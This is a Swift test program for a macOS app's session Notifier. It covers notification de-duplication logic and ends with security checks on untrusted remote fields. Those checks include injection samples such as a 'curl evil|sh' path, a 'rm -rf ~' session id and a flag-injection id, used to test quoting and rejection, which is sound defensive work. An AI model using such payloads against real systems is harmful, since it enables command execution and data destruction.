import Foundation

/// Exercises `Notifier.observe`'s decision logic offline.
///
/// `Notifier` needed four separate corrections during development, every one
/// found by review rather than by a test -- it is a state machine with real
/// invariants and no executable statement of them. This closes that gap by
/// replacing the real `UNUserNotificationCenter` side effect with a plain
/// recording closure via the `post` seam `Notifier.init` exposes, and driving
/// `observe` directly with fabricated `Session` values.
///
/// No XCTest, no SwiftPM package -- there isn't one in this repo, and this
/// test target isn't reason enough to add it. `run.sh` compiles this file
/// together with just `Session.swift` and `Notifier.swift` (not the whole
/// `Sources/` directory -- that also carries `CrowsNestApp.swift`'s
/// `@main`, which would collide with this file's) and runs the result. A
/// plain executable that exits non-zero on any failed check is the whole
/// contract.
@main
struct NotifierTests {
    @MainActor
    static func main() async {
        var failures: [String] = []

        func check(_ name: String, _ condition: @autoclosure () -> Bool) {
            if condition() {
                print("ok   - \(name)")
            } else {
                failures.append(name)
                print("FAIL - \(name)")
            }
        }

        /// A fresh `Notifier` with a recording `post`, plus a closure to read
        /// back what it recorded.
        func makeNotifier(authorized: Bool = true) -> (notifier: Notifier, posted: () -> [Session]) {
            var posted: [Session] = []
            let notifier = Notifier(authorized: authorized) { session in posted.append(session) }
            return (notifier, { posted })
        }

        func session(_ id: String, _ state: Session.State, age: Double?) -> Session {
            Session(sessionId: id, state: state, stateReason: nil, name: nil, cwd: nil,
                    repoRoot: nil, repoName: "repo", relPath: nil, model: nil,
                    contextTokens: nil, ageSecs: age, gitBranch: nil)
        }

        // 1. Launch with several already-blocked/waiting sessions -> zero
        //    notifications. The very first `observe` call only seeds a
        //    baseline, regardless of what it's seeded with -- notifying here
        //    would mean opening the app with eight blocked sessions fires
        //    eight alerts at once, exactly what this class exists to avoid.
        do {
            let (n, posted) = makeNotifier()
            n.observe([session("a", .blocked, age: 40), session("b", .waiting, age: 10)])
            check("launch with already-blocked/waiting sessions posts nothing", posted().isEmpty)
        }

        // 2. working -> blocked -> exactly one notification; stays blocked
        //    across further polls -> no repeats.
        do {
            let (n, posted) = makeNotifier()
            n.observe([session("a", .working, age: 5)])      // seed
            n.observe([session("a", .blocked, age: 91)])     // real transition -> notify
            n.observe([session("a", .blocked, age: 106)])    // unchanged -> quiet
            n.observe([session("a", .blocked, age: 121)])    // unchanged -> quiet
            check("working -> blocked notifies exactly once", posted().count == 1)
            check("staying blocked across further polls does not repeat",
                  posted().map(\.sessionId) == ["a"])
        }

        // 3. First poll misses the remote host entirely (transport failure ->
        //    empty session list), a later poll reconnects with sessions that
        //    have been sitting blocked for hours -> zero. A first-ever
        //    sighting is ambiguous (brand new vs. merely invisible until now)
        //    and age breaks the tie; hours old reads as "existed all along".
        do {
            let (n, posted) = makeNotifier()
            n.observe([])                                      // host unreachable -> seeds empty
            n.observe([session("a", .blocked, age: 3 * 3600)])  // reconnect, stale
            check("reconnect with hours-old blocked sessions posts nothing", posted().isEmpty)
        }

        // 4. A genuinely new session, first sighting already blocked and
        //    fresh (~95s, just past collector.py's 90s stillness floor) ->
        //    exactly one. The mirror image of (3): the same ambiguous
        //    first-sighting path, resolved the other way by age.
        do {
            let (n, posted) = makeNotifier()
            n.observe([])                              // baseline
            n.observe([session("a", .blocked, age: 95)]) // fresh first sighting
            check("fresh first-ever blocked sighting notifies once", posted().count == 1)
        }

        // 5. Mid-session outage (one poll comes back empty), then the same
        //    session returns in the same state it left in -> zero. Identity
        //    is retained across the gap (`previous` is sticky), so this is
        //    not treated as a fresh sighting at all.
        do {
            let (n, posted) = makeNotifier()
            n.observe([session("a", .blocked, age: 95)])  // seed
            n.observe([])                                 // outage -- "a" temporarily invisible
            n.observe([session("a", .blocked, age: 240)]) // reconnect, same state
            check("outage-and-return in the same state posts nothing", posted().isEmpty)
        }

        // 6. Age-out after `forgetAfterMissedPolls` (20), then return.
        //    Asserted deliberately, in two halves so neither leaks state into
        //    the other (any `observe` call that re-mentions "a" resets its
        //    miss counter to 0, which would corrupt a single shared trace):
        //
        //    6a. Exactly 20 consecutive misses does NOT forget -- identity
        //        and state both survive, so an unchanged return stays quiet.
        //    6b. 21 consecutive misses DOES forget -- the entry is purged,
        //        so a return is judged as a brand-new first sighting (by
        //        age, per (3)/(4) above), not as "same state, stay quiet".
        //        This is what the code actually does; it is not obviously
        //        the only reasonable choice, which is exactly why it needs
        //        an explicit, deliberate assertion rather than silence.
        do {
            let (n, posted) = makeNotifier()
            n.observe([session("a", .blocked, age: 95)])    // seed, missedPolls -> 0
            for _ in 0..<20 { n.observe([]) }                // missedPolls -> 20, not yet forgotten
            n.observe([session("a", .blocked, age: 9000)])   // still tracked as blocked -> quiet
            check("20 missed polls retains identity (same-state stays quiet)", posted().isEmpty)
        }
        do {
            let (n, posted) = makeNotifier()
            n.observe([session("a", .blocked, age: 95)])     // seed, missedPolls -> 0
            for _ in 0..<21 { n.observe([]) }                 // missedPolls -> 21 -> forgotten
            n.observe([session("a", .blocked, age: 95)])      // returns fresh-looking
            check("21 missed polls forgets identity; a fresh-looking return notifies once",
                  posted().count == 1)
        }

        // Unauthorized: `observe` must stay silent even on a real state
        // change if the OS never granted permission.
        do {
            let (n, posted) = makeNotifier(authorized: false)
            n.observe([session("a", .working, age: 5)])
            n.observe([session("a", .blocked, age: 91)])
            check("no notification without authorization, even on a real transition",
                  posted().isEmpty)
        }

        // --- Security: untrusted remote strings must not become shell code ---
        // A compromised or shared remote authors `cwd`; the owner pastes the
        // resulting Copy-Resume command into a terminal on their own Mac.

        // Shell.quote neutralises the classic injection payloads.
        check("shell-quote wraps a plain path",
              Shell.quote("/home/u/work") == "'/home/u/work'")
        check("shell-quote contains a command-substitution payload",
              Shell.quote("/tmp; curl evil|sh") == "'/tmp; curl evil|sh'")
        check("shell-quote escapes an embedded single quote (closes-then-reopens)",
              Shell.quote("a'b") == "'a'\\''b'")
        check("shell-quote strips a newline so it cannot start a new command",
              !Shell.quote("/tmp\ncurl evil|sh").contains("\n"))

        // A session id carrying shell metacharacters is rejected at decode, so
        // a malicious row is dropped rather than reaching `--resume`.
        func decodeSessions(_ json: String) -> [Session] {
            let framed = "{\"sessions\":\(json)}"
            let dec = JSONDecoder()
            dec.keyDecodingStrategy = .convertFromSnakeCase
            let payload = try? dec.decode(CollectorPayload.self, from: Data(framed.utf8))
            return payload?.sessions ?? []
        }
        let mixed = decodeSessions("""
        [{"session_id":"7d703329-70ae-4d8b-9915-e7261e6ac814","state":"blocked","repo_name":"r"},
         {"session_id":"aaa; rm -rf ~ #","state":"blocked","repo_name":"r"}]
        """)
        check("a well-formed session id decodes", mixed.contains { $0.sessionId.hasPrefix("7d703329") })
        check("a session id with shell metacharacters is dropped, not sanitised",
              !mixed.contains { $0.sessionId.contains(";") })
        check("one malicious row does not blank the machine's whole list",
              mixed.count == 1)

        // Control characters are stripped from free-text remote fields that
        // reach tooltips and notification bodies.
        let ctrl = decodeSessions("""
        [{"session_id":"ok-id","state":"blocked","repo_name":"r","name":"line1\\nline2"}]
        """)
        check("control characters are stripped from remote free-text",
              ctrl.first?.name == "line1line2")

        // A session id that is a lone flag must be rejected, so it can never be
        // read as an argument to `claude`.
        let dash = decodeSessions("""
        [{"session_id":"--resume","state":"blocked","repo_name":"r"},
         {"session_id":"good-id","state":"blocked","repo_name":"r"}]
        """)
        check("a leading-dash session id is rejected", dash.count == 1)
        check("the good row alongside it survives", dash.first?.sessionId == "good-id")

        // A trailing newline in an id (which an anchored regex would tolerate)
        // is rejected by the CharacterSet check.
        let trailNL = decodeSessions("""
        [{"session_id":"abc\\n","state":"blocked","repo_name":"r"}]
        """)
        check("a session id with a trailing newline is rejected", trailNL.isEmpty)

        // clean() strips the Unicode line separator (U+2028), not just LF/CR.
        check("clean strips U+2028 line separator",
              Session.clean("a\u{2028}b") == "ab")

        // hidden-session reason is cleaned too (it lands in last-poll.log).
        func decodePayload(_ json: String) -> CollectorPayload? {
            let dec = JSONDecoder(); dec.keyDecodingStrategy = .convertFromSnakeCase
            return try? dec.decode(CollectorPayload.self, from: Data(json.utf8))
        }
        let hid = decodePayload("""
        {"sessions":[],"hidden":[{"session_id":"x","reason":"gone\\u001b[31mRED"}]}
        """)
        check("a hidden reason has control bytes stripped",
              hid?.hidden?.first?.reason == "gone[31mRED")

        print()
        if failures.isEmpty {
            print("All checks passed.")
            exit(0)
        } else {
            print("\(failures.count) FAILED:")
            for name in failures { print("  - \(name)") }
            exit(1)
        }
    }
}
